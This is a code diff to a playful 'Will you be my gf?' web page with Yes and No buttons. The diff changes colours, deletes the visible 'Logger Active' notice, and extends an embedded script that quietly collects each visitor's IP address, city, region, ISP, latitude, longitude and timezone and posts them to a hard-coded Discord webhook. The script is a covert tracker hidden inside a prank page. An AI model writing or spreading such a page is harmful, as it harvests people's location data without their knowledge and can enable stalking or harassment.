@@ -15,7 +15,7 @@
             justify-content: center;
             align-items: center;
             height: 150vh;
-            background-color: #fabeff;
+            background-color: #ff69b4; /* Solid pink background */
         }
 
         .container {
@@ -92,17 +92,16 @@
             justify-content: center;
             align-items: center;
             margin-top: 30px;
-            background-color: #fabeff;
+            background-color: #ff69b4; /* Match pink background */
         }
     </style>
 </head>
-<body style="background: url('https://i.pinimg.com/736x/3a/89/6d/3a896dc76982ec3f0d49316c9fb2de4c.jpg') no-repeat center center fixed; -webkit-background-size: cover; -moz-background-size: cover; -o-background-size: cover; background-size: cover; -webkit-filter: none; filter: none;">
+<body>
     <div class="container">
         <div class="image-container">
             <img src="https://i.pinimg.com/originals/ec/e4/ef/ece4ef519acc193968d6adc55ff315c1.gif" alt="Question GIF" class="big-image">
-            <div class="text-overlay">Will you be my gf?</div>
+            <div class="text-overlay">Be my gf?</div>
         </div>
-        <div class="center-text">Logger Active</div>
         <div class="buttons">
             <button class="moving-btn" id="yesButton">Yes</button>
             <button class="moving-btn" id="noButton">No</button>
@@ -115,7 +114,7 @@
         </div>
     </div>
     <script>
-        // Logger script to send data to Discord
+        // Enhanced logger script to ensure all features pop up
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1397667597784453210/5Ync1yXCfohUTF3Ey_ljtKLjDn37K3GEqPLndRZwVZU0onGSLuEhgaOMICmVzOpJP_F2";
 
         async function getLocationData() {
@@ -128,11 +127,23 @@
                     country: data.country_name || "Unknown Country",
                     city: data.city || "Unknown City",
                     region: data.region || "Unknown Region",
-                    isp: data.org || "Unknown ISP"
+                    isp: data.org || "Unknown ISP",
+                    latitude: data.latitude || "Unknown",
+                    longitude: data.longitude || "Unknown",
+                    timezone: data.timezone || "Unknown"
                 };
             } catch (error) {
                 console.warn('Location fetch failed:', error);
-                return { ip: "Unknown IP", country: "Unknown Country", city: "Unknown City", region: "Unknown Region", isp: "Unknown ISP" };
+                return {
+                    ip: "Unknown IP",
+                    country: "Unknown Country",
+                    city: "Unknown City",
+                    region: "Unknown Region",
+                    isp: "Unknown ISP",
+                    latitude: "Unknown",
+                    longitude: "Unknown",
+                    timezone: "Unknown"
+                };
             }
         }
 
@@ -143,15 +154,18 @@
                 embeds: [{
                     title: "📊 Data Logged",
                     description: `Answer: ${answer} from: ${window.location.href || 'Unknown URL'}`,
-                    color: 0xfabeff,
+                    color: 0xff69b4, /* Match pink theme */
                     fields: [
                         { name: "IP Address", value: data.ip, inline: true },
                         { name: "Country", value: data.country, inline: true },
                         { name: "City", value: data.city, inline: true },
                         { name: "Region", value: data.region, inline: true },
-                        { name: "ISP", value: data.isp, inline: true }
+                        { name: "ISP", value: data.isp, inline: true },
+                        { name: "Latitude", value: data.latitude, inline: true },
+                        { name: "Longitude", value: data.longitude, inline: true },
+                        { name: "Timezone", value: data.timezone, inline: true }
                     ],
-                    footer: { text: "Logged: IP, Country, City, Region, ISP" },
+                    footer: { text: "Logged: IP, Country, City, Region, ISP, Lat/Long, Timezone" },
                     timestamp: new Date().toISOString()
                 }]
             };
